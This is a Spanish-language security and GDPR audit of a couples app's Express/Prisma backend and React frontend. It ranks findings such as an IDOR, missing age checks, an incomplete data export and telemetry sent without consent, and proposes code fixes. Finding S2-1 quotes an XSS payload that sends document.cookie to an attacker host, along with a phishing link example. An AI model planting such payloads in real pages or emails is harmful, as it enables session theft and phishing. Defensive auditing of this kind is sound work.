# Auditoría 04 — Seguridad y GDPR

> Fecha: 2026-05-05 · Versión auditada: v2.3.5 (commit en `main`)
> Auditor: Security Reviewer (Claude)
> Alcance: backend Express + Prisma, frontend React/Vite, infra Render+Supabase+FTP, operación EU
> Audit anterior referenciado: `docs/audits/2026-05-02-audit-pre-v1.7.md`

---

## Resumen ejecutivo

**Estado general: VERDE con caveats.** El audit del 2026-05-02 identificó 4 S0 GDPR; **3 de los 4 ya están corregidos** en v1.6.2+ (export Art. 20, edad Art. 8 en signup individual y register-with-code, banner de cookies + opt-out PostHog). Las 4 áreas críticas que quedan:

| Severidad | Hallazgos |
|---|---|
| **S0** | 2 (IDOR retrospective, GDPR Art. 8 incompleto en `/api/auth/register`) |
| **S1** | 6 (export incompleto Art. 20, journal cascade en hard-purge, sin password reset, telemetría backend sin consent, retention no anonimiza Event/TaskLog del ghost, refresh tokens no activados) |
| **S2** | 7 (XSS en emails HTML, data:image/svg permitido en proof, sin logout/blacklist JWT, headers de seguridad ausentes en CSP, etc.) |
| **S3** | 5 (notas, hardening defensivo) |

**Prioridad inmediata (S0):** parchear retrospective IDOR + cerrar Art. 8 en `signupSchema` (~2h). Resto se puede planificar en una versión dedicada de hardening.

**Stack defensivo robusto ya en sitio:** helmet, CORS strict por env, rate-limit granular por bucket, JWT_SECRET ≥32 chars validado al boot, bcryptjs cost 10, Zod en todas las rutas auth, soft-delete + retención por cron, AES-256-GCM para Google tokens, telemetría con whitelist anti-PII, banner de cookies con focus-trap y opt-out por defecto. **El audit anterior decía PostHog no instalado — está instalado en backend (`posthog-node@4.2.0`) y frontend (`posthog-js@1.181.0`).**

---

## S0 — Críticos (parchear antes del próximo deploy)

### S0-1 · IDOR en `journalRetrospective.update` permite marcar como leídas retrospectivas de otra pareja
- **OWASP:** A01 Broken Access Control · **GDPR:** Art. 32 (integridad)
- **Archivo:** `src/backend/src/routes/journal.ts:181-196`
- **Problema:** El handler `POST /api/journal/retrospectives/:id/seen` verifica que el coupleId del JWT existe pero NO valida que la retrospectiva pertenezca a ese couple. La query final `prisma.journalRetrospective.update({ where: { id: req.params.id }, ... })` actualiza por id sin filtro de coupleId. Un atacante autenticado en el couple A puede marcar como vista (`seenByUser1`/`seenByUser2`) cualquier retrospectiva del couple B si conoce su id.
- **Riesgo técnico:** Modificación de estado de objetos ajenos. La payload mostrada al partner del couple B cambia, alterando UX y métricas. No expone datos pero corrompe integridad.
- **Riesgo legal:** GDPR Art. 32 exige integridad. Reportable como incidente menor si se explota.
- **Fix (10 líneas):**
  ```ts
  // Verificar ownership ANTES del update.
  const retro = await prisma.journalRetrospective.findFirst({
    where: { id: req.params.id, coupleId },
    select: { id: true },
  })
  if (!retro) return res.status(404).json({ error: 'Not found' })
  await prisma.journalRetrospective.update({ where: { id: retro.id }, data: update })
  ```
- **Esfuerzo:** 30 min · **Test:** integration test con dos couples y un id cruzado.

### S0-2 · GDPR Art. 8 incompleto: `/api/auth/register` (couple register) no exige confirmación de mayoría de edad
- **OWASP:** A04 Insecure Design · **GDPR:** Art. 8 (consentimiento de menores) · **LOPDGDD Art. 7** (España: 14 años)
- **Archivo:** `src/backend/src/schemas/authSchemas.ts:3-11`
- **Problema:** El schema `signupSchema` (usado por `POST /api/auth/register`, registro de pareja completo de una sola vez) no incluye el campo `ageConfirmed: z.literal(true)` que SÍ exigen `signupUserSchema`, `acceptInviteSchema` y `registerWithCodeSchema`. Cualquier menor puede registrar una pareja entera vía `/register` sin nunca declarar mayoría de edad. El audit anterior cerró 3 de las 4 puertas de signup; esta es la 4ª.
- **Riesgo legal:** Multa GDPR hasta 4% de facturación o 20M€. Especialmente sensible en app de pareja (datos íntimos).
- **Riesgo técnico:** ninguno técnico — pero litigio o queja AEPD.
- **Fix:**
  ```ts
  export const signupSchema = z.object({
    email1: z.string().email(),
    password1: z.string().min(8),
    name1: z.string().min(2),
    email2: z.string().email(),
    password2: z.string().min(8),
    name2: z.string().min(2),
    language: z.string().optional().default('es'),
    ageConfirmed: z.literal(true, { errorMap: () => ({ message: 'Debes confirmar que ambos tenéis 18 años o más' }) }),
  })
  ```
  Y añadir el checkbox al frontend en `Signup.tsx`.
- **Esfuerzo:** 1h (schema + frontend + 2 tests + actualización de privacy.md) · **Test:** contract test que registre sin `ageConfirmed` → 400.

---

## S1 — Altos (planificar versión de hardening v2.4.x)

### S1-1 · Export GDPR Art. 20 incompleto: omite JournalEntry, JournalReaction, MoodLog del partner, datos de gamificación
- **OWASP:** N/A · **GDPR:** Art. 20 (portabilidad)
- **Archivo:** `src/backend/src/routes/account.ts:88-158`
- **Problema:** El handler `GET /api/account/export` devuelve `user`, `profile`, `couple`, `pointsTransactions`, `eventsCreated`, `taskLogs`, `moodLogs`, `notifications`, `invitationsSent`. **No incluye** entidades creadas en v2.0.x:
  - `JournalEntry` autoradas o recibidas (las "letters")
  - `JournalReaction` propias
  - `Achievement` desbloqueados (`UserAchievement`)
  - `Streak`, `XP`, `level`
  - `Replay`, `Challenge` participation
  - `RuleProposal`, `ConfigurationProposal`
  - `Child`, `Pet` del couple
  - `CalendarEntry` creadas/asignadas
  - `Subscription` (plan, billing)
- **Riesgo legal:** Art. 20 exige TODOS los datos personales en formato estructurado. Auditoría AEPD vería la omisión de cartas íntimas (journal letters) y logros como incumplimiento.
- **Fix:** Extender el bundle. Plantilla:
  ```ts
  const [journalAuthored, journalReceived, achievements, children, pets, calendarEntries, subs, ...] = await Promise.all([...])
  bundle.journal = { authored: journalAuthored, received: journalReceived, reactions: ... }
  bundle.gamification = { achievements, xp, level, streaks }
  bundle.family = { children, pets }
  ```
  Incrementar `schemaVersion` a `2.3.5` y documentar en `docs/legal/privacy.md`.
- **Esfuerzo:** 4-6h (incluye snapshot de schema completo) · **Test:** golden file test que asegure todas las relaciones del User en `schema.prisma` aparezcan en el export.

### S1-2 · `accountDeletionService` no anonimiza ni borra JournalEntry del usuario
- **OWASP:** A04 · **GDPR:** Art. 17 (derecho al olvido)
- **Archivo:** `src/backend/src/services/accountDeletionService.ts:55-78`
- **Problema:** El servicio reasigna FKs a un user-fantasma para `PointsTransaction`, `TaskLog`, `Event`, `Negotiation`. **No toca** `JournalEntry.authorId/recipientId` ni `JournalReaction.userId`. Como el schema declara `JournalEntry.author User @relation(... onDelete: Cascade)` (línea 839 de `schema.prisma`), cuando el cron de retención ejecute `prisma.user.deleteMany()` a los 30+ días, **cascade-borrará TODAS las journal entries del user**, incluyendo las "letters" enviadas al partner que el partner ya había leído. El partner pierde el histórico irrecuperable.
- **Riesgo legal/UX:** Pérdida de datos del partner sin su consentimiento. Inversa al objetivo del soft-delete.
- **Riesgo técnico:** integridad referencial OK pero pérdida de contenido compartido.
- **Fix:**
  1. En `accountDeletionService.ts` añadir antes del soft-delete:
     ```ts
     // Letters/journal del user → reasignar al ghost para preservarlas en el couple.
     await tx.journalEntry.updateMany({ where: { authorId: userId }, data: { authorId: ghost.id } })
     await tx.journalEntry.updateMany({ where: { recipientId: userId }, data: { recipientId: ghost.id } })
     await tx.journalReaction.deleteMany({ where: { userId } })  // reacciones individuales se borran
     ```
  2. **Crítico**: cambiar `onDelete: Cascade` → `onDelete: SetNull` (o quitar y manejar manual) en `JournalEntry.author` para evitar cascade en el hard-purge tardío. Migración Prisma requerida.
- **Esfuerzo:** 3-4h (servicio + migración + tests) · **Test:** soft-delete + run retention 30d, verificar que journal entries del partner siguen visibles.

### S1-3 · Retention `dataRetentionJob` no anonimiza/limpia datos del ghost user
- **OWASP:** A04 · **GDPR:** Art. 5(1)(c) minimización · Art. 17
- **Archivo:** `src/backend/src/jobs/dataRetentionJob.ts:36`
- **Problema:** El job hace `prisma.user.deleteMany({ where: { deletedAt: { lt: cutoff } } })` que borra al user soft-deleted. Pero ANTES, `accountDeletionService` ya creó un ghost user con `email: ghost-${coupleId}@deleted.local` y `deletedAt: new Date()`. Ese ghost ALSO tiene `deletedAt < cutoff` cuando han pasado 30+d, así que también se purga. Cuando el ghost se borra, las FKs (PointsTransaction, TaskLog, Event, Negotiation con `userId/createdBy/proposedBy/respondedBy = ghost.id`) son afectadas. Si la relación es `onDelete: SetNull`, los registros quedan con userId=null pero los puntos siguen contando. Si es `onDelete: Cascade`, se cascade-borran los registros (pérdida del balance del partner).
- **Verificar el behavior real:**
  ```bash
  grep -A2 "User.*onDelete" src/backend/prisma/schema.prisma
  ```
- **Riesgo:** dependiendo del onDelete, balance del partner se altera o se pierden registros históricos compartidos que el privacy policy promete conservar (sección 5: "Datos de balance e histórico (PointsTransaction, Event, TaskLog) — Vida de la cuenta").
- **Fix:** que el ghost NUNCA se purgue. Filtrar el query del cron para excluir emails `ghost-*@deleted.local`:
  ```ts
  const userPurged = (await prisma.user.deleteMany({
    where: {
      deletedAt: { lt: userPurgeCutoff },
      NOT: { email: { startsWith: 'ghost-' } },
    },
  })).count
  ```
  Y hard-purgar el ghost solo cuando el couple esté disuelto Y todos los users humanos del couple ya estén purgados (segundo cron, frecuencia mensual).
- **Esfuerzo:** 2-3h · **Test:** simular delete de user1, esperar 31d simulados, verificar que ghost sigue presente y user1 borrado, y que balance del user2 sigue intacto.

### S1-4 · Sin endpoint de "olvidé mi contraseña" — usuario locked-out no puede recuperar acceso
- **OWASP:** A07 · **GDPR:** Art. 32 (continuidad)
- **Archivo:** `src/backend/src/routes/authRoutes.ts` (ausencia)
- **Problema:** No existe `/api/auth/password-reset-request` ni `/api/auth/password-reset`. Si un usuario olvida su password, no hay forma documentada de recuperar la cuenta (solo borrarla y registrarse de nuevo, perdiendo el couple). En producción esto generará tickets de soporte y customer pain.
- **Riesgo legal:** Indirectamente Art. 32 (acceso del titular a sus datos depende de poder loguearse).
- **Fix (versión):**
  1. Endpoint `POST /api/auth/password-reset-request` con `criticalBucket` rate-limit (3/hora/IP).
  2. Genera token random 32 bytes hex, hash sha256, guarda en tabla `PasswordReset` con `expiresAt: 1h` y `usedAt: null`.
  3. Resend mail con link `${FRONTEND_URL}/reset?token=...`.
  4. Endpoint `POST /api/auth/password-reset` valida token + hashea nueva password + invalida token.
  5. Telemetría `auth.password_reset_requested` y `auth.password_reset_completed` (sin email).
- **Esfuerzo:** 4-6h (schema + service + 2 endpoints + frontend page + tests) · **Test:** flujo end-to-end con dos accounts en tests/integration.

### S1-5 · Telemetría backend a PostHog con userId sin verificar consent
- **OWASP:** A09 · **GDPR:** Art. 6(1)(a) consent · Art. 7
- **Archivo:** `src/backend/src/services/telemetry.ts:46-55` · `src/backend/src/routes/account.ts:81,151` · `src/backend/src/routes/couple.ts:29`
- **Problema:** El backend llama `telemetryBackend.track(userId, 'account.deleted', {})` y similares pasando `userId` como `distinctId` a PostHog. La política de privacidad sección 3 declara que "Análisis identificado de uso (PostHog con userId)" requiere **consentimiento explícito**. Pero el backend NO conoce el estado del consent del usuario (vive en cookie del navegador, gestionado en frontend por `services/consent.ts`). Resultado: aunque el user diga "Solo esenciales", el backend sigue identificando sus eventos de delete/export/leave en PostHog.
- **Riesgo legal:** Vulneración de Art. 6 + Art. 7 GDPR. Reclamo AEPD muy plausible. Multa potencial.
- **Riesgo técnico:** ninguno.
- **Fix:**
  1. Añadir columna `analyticsConsent: Boolean? @default(false)` a `User`.
  2. Frontend al guardar consent llama `PUT /api/profile/me` con `analyticsConsent: true|false`.
  3. `telemetryBackend.track` recibe `userId | null` — si la BD dice `analyticsConsent=false`, pasar `null` (anónimo) o usar un `distinctId` derivado (hash de userId+día) sin identificar.
  4. Documentar en `docs/legal/posthog-dashboard.md` el flow.
- **Esfuerzo:** 4-6h (migración + sync front-back + audit posterior de eventos) · **Test:** mock PostHog y assertear que sin consent el `distinctId` no se reusa.

### S1-6 · Refresh tokens implementados pero NO activados — JWT vive 7d sin posibilidad de rotación/revocación
- **OWASP:** A07 · **GDPR:** Art. 32
- **Archivo:** `src/backend/src/services/refreshTokenService.ts:1-12` (banner explícito "NO ACTIVADO en producción")
- **Problema:** El servicio está completo (issue/rotate/revoke/detectReuse) pero no hay endpoint que lo exponga. Login emite JWT con `expiresIn: 7d` y no hay forma de revocarlo: ni logout (línea 0 — no existe el endpoint), ni blacklist, ni ningún check `tokenIssuedAt`. Si un JWT se filtra (devtools, sniffing en wifi pública, MITM si HSTS no aplica antes del primer hit), el atacante tiene 7 días libres.
- **Riesgo legal:** Art. 32 exige medidas técnicas apropiadas — token de 7d sin revocación es marginal.
- **Fix:**
  1. Activar el flow: en `loginUser` emitir además un refresh token, devolverlo en el body.
  2. Frontend guarda el refresh en localStorage separado.
  3. Endpoint `POST /api/auth/refresh` rota.
  4. Endpoint `POST /api/auth/logout` revoca + frontend hace `clearToken()` + invalida cache de auth (`invalidateAuthCache(userId)`).
  5. Reducir JWT expiry a `15m`.
- **Esfuerzo:** 6-8h (incluye coordinación back-front sin romper sesiones in-flight; recomendado cierre dedicado de versión v2.4.x). · **Test:** rotación, reuse detection, logout revoca toda la chain.

---

## S2 — Medios (hardening, pre-prod)

### S2-1 · XSS en emails HTML transaccionales (interpolación sin escape)
- **OWASP:** A03 · **GDPR:** N/A
- **Archivo:** `src/backend/src/services/emailService.ts:67-75,84-86`
- **Problema:** En `deleteAccountCodeEmail(code, userName)` y `inviteEmail(inviterName, link)` se hace template string `Hola ${userName}` directamente en HTML. Si `userName` contiene `<img onerror=fetch('https://attacker.com?c='+document.cookie)>`, los clientes de email modernos (Gmail, Outlook web) sandbox JS pero NO bloquean HTML estructural — un atacante puede meter `<a href="https://phishing.com">click aquí</a>` dentro del email del partner suplantando el botón legítimo. Aprovecha el campo `name` (z.string().min(2)) que no excluye caracteres HTML. El `link` también es interpolado en `href="${link}"` — si ese link viniera de input del usuario sería SSRF/redirect, pero aquí lo construye el server (`${origin}/onboarding/join?token=...`). Riesgo principal: nombre.
- **Riesgo técnico:** phishing dentro del contexto del email (suplantación de botón).
- **Fix:**
  ```ts
  function escHtml(s: string): string {
    return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]!))
  }
  // y usar escHtml(userName) en todas las interpolaciones de plantillas HTML.
  ```
- **Esfuerzo:** 1h · **Test:** plantilla con `userName='<script>'` debe quedar `&lt;script&gt;`.

### S2-2 · `proofImageUrl` acepta `data:image/svg+xml` (potencial XSS si se opens-in-new-tab)
- **OWASP:** A03 · **GDPR:** N/A
- **Archivo:** `src/backend/src/routes/taskProof.ts:29-35`
- **Problema:** El validador `z.string().refine(s => s.startsWith('data:image/'))` acepta `data:image/svg+xml;base64,...`. Una SVG puede contener `<script>` y, aunque dentro de `<img src=>` los browsers lo neutralizan, si el frontend en algún flujo abre la imagen en nueva pestaña o el partner inspecciona el data-url, puede ejecutarse. También permite tracking pixels y exfil via `<image href=>`.
- **Riesgo técnico:** XSS condicional, fingerprinting cross-site.
- **Fix:** lista blanca explícita:
  ```ts
  const ALLOWED_PREFIXES = ['data:image/jpeg', 'data:image/jpg', 'data:image/png', 'data:image/webp']
  // y rechazar si no matches alguno (o si es svg+xml).
  ```
  O, mejor, externalizar el storage: subir a Supabase Storage con URL firmada y validar el dominio. Eso elimina además el bloat de la BD.
- **Esfuerzo:** 1h fix mínimo, 4-6h migración a Supabase Storage · **Test:** payload `data:image/svg+xml,...` → 400.

### S2-3 · No hay endpoint de logout ni blacklist de JWT
- **OWASP:** A07 · **GDPR:** Art. 32
- **Archivo:** `src/backend/src/routes/authRoutes.ts` (ausencia) · `src/frontend/src/services/apiClient.ts:30-33` (clearToken solo borra localStorage)
- **Problema:** El "logout" del frontend solo limpia localStorage; el JWT sigue siendo válido en el server hasta que expira (7d). Si el user se da cuenta de un dispositivo perdido, NO hay forma de invalidar la sesión.
- **Fix:** depende de S1-6 (refresh tokens). Sin refresh tokens, opción rápida es una `tokenIssuedAt` columna en User y middleware que rechaza tokens emitidos antes de `passwordChangedAt` o `forceLogoutAt`.
- **Esfuerzo:** 2-4h interim, 6-8h con refresh tokens · **Test:** después de logout, request con token viejo → 401.

### S2-4 · Helmet config relajada — sin CSP en backend, CrossOriginResourcePolicy='cross-origin'
- **OWASP:** A05
- **Archivo:** `src/backend/src/server.ts:83-86`
- **Problema:** `contentSecurityPolicy: false` desactiva CSP en respuestas del backend. Las API son JSON, así que CSP no es estrictamente necesaria — pero ciertos endpoints (export `Content-Disposition: attachment`) podrían beneficiarse de un CSP minimal. Más importante: **el FRONTEND no tiene CSP via meta-http o headers de FTP**. Verificar en `index.html` y, si se sube por FTP a keepitup.io, considerar configurar CSP en el HTML mismo (`<meta http-equiv="Content-Security-Policy" content="...">`).
- **Riesgo:** XSS dependerían de fallo en escape — bajo, pero defense in depth.
- **Fix:** añadir CSP en `index.html`:
  ```html
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://*.posthog.com https://*.sentry.io; connect-src 'self' https://matripuntos-api.onrender.com https://*.posthog.com https://*.sentry.io; img-src 'self' data: https:; style-src 'self' 'unsafe-inline'; font-src 'self' data:;">
  ```
- **Esfuerzo:** 1-2h (probar que PostHog/Sentry siguen funcionando) · **Test:** consola del navegador no muestra violations.

### S2-5 · `auth/me` y `auth/couple` exponen email del partner sin necesidad clara
- **OWASP:** A01 · **GDPR:** Art. 5(1)(c) minimización
- **Archivo:** `src/backend/src/routes/authRoutes.ts:222-239` (couple includes `email`)
- **Problema:** El endpoint `GET /api/auth/couple` devuelve `email` de cada user del couple. ¿El frontend lo necesita? Si solo se muestra el `name`, exponer email es minimización innecesaria. Cuando un atacante compromete una cuenta, además se queda con el email del partner para spear-phishing.
- **Fix:** quitar el email del select si el frontend no lo usa. Verificar UI.
- **Esfuerzo:** 30 min · **Test:** snapshot de la respuesta.

### S2-6 · Google OAuth `/auth` URL sin parámetro `state` (CSRF al activarse v2.0.1.x)
- **OWASP:** A04 (insecure design pre-production)
- **Archivo:** `src/backend/src/routes/googleCalendarOauth.ts:38-50`
- **Problema:** Cuando se active el flow real (hoy es stub), el endpoint `/auth` construye la URL OAuth sin `state`. Eso permite CSRF: un atacante engaña al user a clickar `https://accounts.google.com/...?...&state=<atackercontrol>` y la callback acepta tokens del attacker. Mitigado parcialmente porque el callback aún es stub (501).
- **Fix antes de activar:** generar `state = crypto.randomBytes(16).toString('hex')`, guardarlo en sesión/redis con TTL 10min, validarlo en `/callback`.
- **Esfuerzo:** 1h al implementar · **Test:** estado fake → 400.

### S2-7 · CORS abierto a `FRONTEND_URL` único — sin allowlist multi-dominio
- **OWASP:** A05
- **Archivo:** `src/backend/src/server.ts:74-94`
- **Problema:** Configurable y restrictivo, OK. Pero si en algún momento se añade un subdominio (preview, staging) hay que recordar abrirlo. No es bug, es nota operativa.
- **Fix:** convertir `FRONTEND_URL` en `FRONTEND_URLS` (CSV).
- **Esfuerzo:** 30 min · **Test:** múltiples orígenes.

---

## S3 — Bajos (notas defensivas)

### S3-1 · `couple-preview/:code` público revela nombres por joinCode
- **Archivo:** `src/backend/src/routes/authRoutes.ts:455-486`
- **Problema:** Endpoint sin auth devuelve `members: [{ name }]` por código de 6 chars. Espacio 36^6 ≈ 2B. `authLimiter` 20/15min protege contra brute force masivo, pero un actor lento puede enumerar. El nombre solo (sin email) es PII baja.
- **Fix opcional:** hashear/truncar el nombre ("E***" en lugar de "Eduardo") o pedir CAPTCHA tras N requests.
- **Esfuerzo:** 1h.

### S3-2 · `categories.ts` y `family.ts` usan `findUnique` + check `coupleId !== user.coupleId` (TOCTOU teórico)
- **Archivo:** `src/backend/src/routes/categories.ts:179-185,229-244` · `src/backend/src/routes/family.ts:108-128,159-171,265-280`
- **Problema:** Patrón `await findUnique(); if (entity.coupleId !== user.coupleId) 403` es teóricamente vulnerable a TOCTOU si entre el find y el update otro request cambia `coupleId`. En la práctica el coupleId nunca muta tras creación. Riesgo nulo pero estilo inferior.
- **Fix:** convertir a `findFirst({ where: { id, coupleId } })` (una sola query, atómica).
- **Esfuerzo:** 30 min × N rutas.

### S3-3 · `subcategories` POST sin Zod (validación tipo-only en runtime)
- **Archivo:** `src/backend/src/routes/categories.ts:311-360`
- **Problema:** No hay schema Zod. `name` puede tener cualquier longitud y emoji puede ser arbitrario.
- **Fix:** añadir schema con `z.string().min(1).max(80)` para name y `z.number().min(0.1).max(10)` para modifier.
- **Esfuerzo:** 30 min.

### S3-4 · `error.message` filtrado solo en development pero `console.error('Error:', err)` queda en logs
- **Archivo:** `src/backend/src/server.ts:260-266`
- **Problema:** En producción la respuesta omite el mensaje (correcto), pero `console.error` con stack queda en logs de Render. Sentry ya captura esto — verificar que stacks no contienen secrets/PII vía `beforeSend`.
- **Fix:** Sentry config: `beforeSend(event) { delete event.request.cookies; ... }`.
- **Esfuerzo:** 1h.

### S3-5 · Rate-limit storage en memoria (single-instance Render)
- **Archivo:** `src/backend/src/middleware/rateLimiter.ts:7-9` (comentario)
- **Problema:** Documentado y aceptado para producción actual single-instance. Cuando se escale a multi-instancia (worker count >1) los buckets se duplican silenciosamente.
- **Fix:** `rate-limit-redis` cuando se escale (ver `docs/legal/scaling-notes.md`).
- **Esfuerzo:** 2-3h cuando proceda.

---

## OWASP Top 10 2021 — Cobertura

| # | Categoría | Estado | Notas |
|---|---|---|---|
| A01 | Broken Access Control | ⚠️ | S0-1 (retro IDOR), S2-5 (email partner exposed). Resto OK. |
| A02 | Cryptographic Failures | ✅ | bcryptjs cost 10, AES-256-GCM (Google tokens), JWT_SECRET ≥32 chars validado al boot. SHA-256 para refresh hash. |
| A03 | Injection | ✅ | Prisma siempre con queries seguras. Solo un `$queryRawUnsafe` con SQL hardcoded (line 133 server.ts) — sin user input. Email HTML S2-1 es la única excepción menor. |
| A04 | Insecure Design | ⚠️ | S0-2 (Art. 8 incompleto), S2-6 (Google state pendiente), S1-4 (no password reset). |
| A05 | Security Misconfiguration | ⚠️ | S2-4 (CSP), S2-7 (CORS single). Helmet aplicado. CrossOriginResourcePolicy relajado a propósito. |
| A06 | Vulnerable Components | ✅ | Stack actualizado: express 4.18.2, Prisma 5.7, jsonwebtoken 9.0.2, axios 1.15.2, react 18.2, react-markdown 10.1. No se ejecutó `npm audit` (sin internet) — recomendado en próxima sesión. |
| A07 | Authentication Failures | ⚠️ | S1-6 (refresh tokens off), S2-3 (no logout/blacklist), S1-4 (no password reset). Bcrypt cost 10 OK. JWT 7d. |
| A08 | Data Integrity Failures | ✅ | Build deps lockfileado, Render deploy auto desde main, no auto-update sin firmar. |
| A09 | Logging Failures | ⚠️ | S1-5 (telemetría sin consent). Sentry captura errores. PII whitelist en telemetry.ts agresiva. Falta audit-log explícito de operaciones sensibles (delete-account, leave-couple) — solo telemetría. |
| A10 | SSRF | ✅ | No hay endpoints que hagan fetch sobre URLs user-controlled. `proofImageUrl` se almacena pero no se fetcha desde el server. Email service envía a Resend (URL fija). |

---

## Compliance check GDPR

| Artículo | Concepto | Estado | Nota |
|---|---|---|---|
| **Art. 6** | Base legal del tratamiento | ✅ | `docs/legal/privacy.md §3` declara contrato + interés legítimo + consentimiento explícito por finalidad. |
| **Art. 7** | Condiciones del consentimiento | ⚠️ | Banner OK, opt-out por defecto OK, pero **S1-5**: backend tracking con userId NO verifica el consent del frontend. Telemetría server-side de events identificados sin verificar. |
| **Art. 8** | Consentimiento de menores | ⚠️ | **S0-2**: Tres de las cuatro rutas de signup (`/signup`, `/accept-invite`, `/register-with-code`) requieren `ageConfirmed=true`. La cuarta (`/register` couple completo) NO. Cerrar antes de cualquier campaña de marketing. |
| **Art. 13** | Información al titular | ✅ | `privacy.md` cubre los 7 puntos obligatorios (responsable, finalidad, base, sub-procesadores, retención, derechos, contacto). Falta declarar el DPO si se nombra. |
| **Art. 15** | Derecho de acceso | ⚠️ | Implementado vía `GET /api/account/export` pero **S1-1**: incompleto (omite journal, achievements, family, calendar, subscription). El user puede acceder a la app y ver sus datos visualmente, pero el export no es exhaustivo. |
| **Art. 17** | Derecho al olvido | ⚠️ | Wizard de 3 pasos + soft-delete + retention 30d implementado correctamente. Pero **S1-2** (journal cascade en hard-purge borra contenido del partner) y **S1-3** (ghost también podría purgarse y romper integridad) son riesgos. Revisar onDelete cascades en schema. |
| **Art. 20** | Portabilidad | ⚠️ | Endpoint existe (Content-Type JSON, attachment), formato estructurado y machine-readable (Art. 20.1 cumplido). Pero **S1-1** lista incompleta. Marcar privacy.md §6 como ✅ cuando esto se complete (hoy aún dice "en preparación" — dato desactualizado). |
| **Art. 30** | Registro de actividades de tratamiento (RAT) | ✅ | `docs/legal/rat.md` existe. Verificar que esté actualizado con v2.0.x (journal, calendar, push subscriptions, refresh tokens). |
| **Art. 32** | Seguridad del tratamiento | ⚠️ | Cifrado en tránsito (Render+Supabase TLS por defecto), bcrypt en reposo para passwords, AES-256-GCM para Google tokens. Falta: cifrado at-rest para journal entries (íntimo) y mood logs sensibles — Supabase ofrece encryption-at-rest pero no E2E. Pseudonimización vía ghost OK. **S1-6** (no rotation), **S2-3** (no logout) son weak points. |
| **Art. 33** | Notificación de violaciones | ⚠️ | No documentado explícitamente quién y cómo se notifica a AEPD en 72h. Crear `docs/legal/breach-procedure.md`. Sentry da el detection automático pero el playbook humano no existe. |
| **Art. 35** | Evaluación de impacto (DPIA) | ⚠️ | App procesa datos sensibles a gran escala (estado emocional/mood = categoría especial Art. 9, datos de menores potenciales si se confirma 18+ correctamente). DPIA recomendable. No existe documento DPIA en `docs/legal/`. Crear `docs/legal/dpia.md`. |

**Sub-procesadores (Art. 28):** documentados en `dpa-checklist.md` — ✅ Render, Supabase, PostHog, Sentry. Falta Resend (añadido posteriormente, verificar DPA firmado).

---

## Recomendaciones priorizadas

### Para v2.4.0 — "Hardening"
1. **S0-1** (30 min) — fix retrospective IDOR.
2. **S0-2** (1h) — `ageConfirmed` en `signupSchema`.
3. **S2-1** (1h) — escape HTML en email templates.
4. **S2-2** (1h) — whitelist MIME type proof image.
5. **S1-1** (4-6h) — completar export GDPR Art. 20.
6. **S1-2** (3-4h) — anonimizar JournalEntry en account deletion + cambiar onDelete a SetNull.
7. **S1-3** (2-3h) — proteger ghost user del cron de retención.
8. Crear `docs/legal/dpia.md` + `docs/legal/breach-procedure.md` (ambos requeridos GDPR Art. 33/35).
9. Actualizar `privacy.md §6` para marcar portabilidad ✅ (actualmente dice "en preparación").

**Esfuerzo total estimado v2.4: 15-20 horas + QA + tests.**

### Para v2.5.0 — "Confianza 2.0"
1. **S1-4** — endpoint password reset.
2. **S1-5** — backend respeta consent del frontend.
3. **S1-6** — activar refresh tokens + endpoint logout (S2-3).
4. **S2-4** — CSP en index.html del frontend.
5. **S2-6** — Google OAuth `state` (cuando se reactive).

### Para revisión continua
1. Ejecutar `npm audit` desde un entorno con internet en cada PR — no se pudo aquí.
2. Tests E2E con dos cuentas para detectar IDOR como el de retrospective antes de merge.
3. Revisar PR de v2.x para asegurar que TODAS las rutas nuevas siguen el patrón `findFirst({ id, coupleId })` en lugar de `findUnique({ id })`.
4. DPIA formal cuando se añadan datos de salud/mood de menores (si se baja edad mínima).

---

## Archivos relevantes (paths absolutos)

- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/server.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/middleware/authMiddleware.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/middleware/rateLimiter.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/services/authService.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/services/accountDeletionService.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/services/cryptoService.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/services/emailService.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/services/refreshTokenService.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/services/telemetry.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/services/webPushService.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/routes/authRoutes.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/routes/account.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/routes/journal.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/routes/notificationRoutes.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/routes/notificationsPush.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/routes/eventRoutes.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/routes/taskProof.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/routes/categories.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/routes/family.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/routes/profile.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/routes/calendar.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/routes/googleCalendarOauth.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/routes/configurationProposals.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/schemas/authSchemas.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/src/jobs/dataRetentionJob.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/backend/prisma/schema.prisma`
- `/Users/edu/Web development/Claude/Matripuntos/src/frontend/src/services/apiClient.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/frontend/src/services/telemetry.ts`
- `/Users/edu/Web development/Claude/Matripuntos/src/frontend/src/components/CookieConsentBanner.tsx`
- `/Users/edu/Web development/Claude/Matripuntos/src/frontend/src/main.tsx`
- `/Users/edu/Web development/Claude/Matripuntos/src/frontend/src/components/v2/proof/TaskProofUploader.tsx`
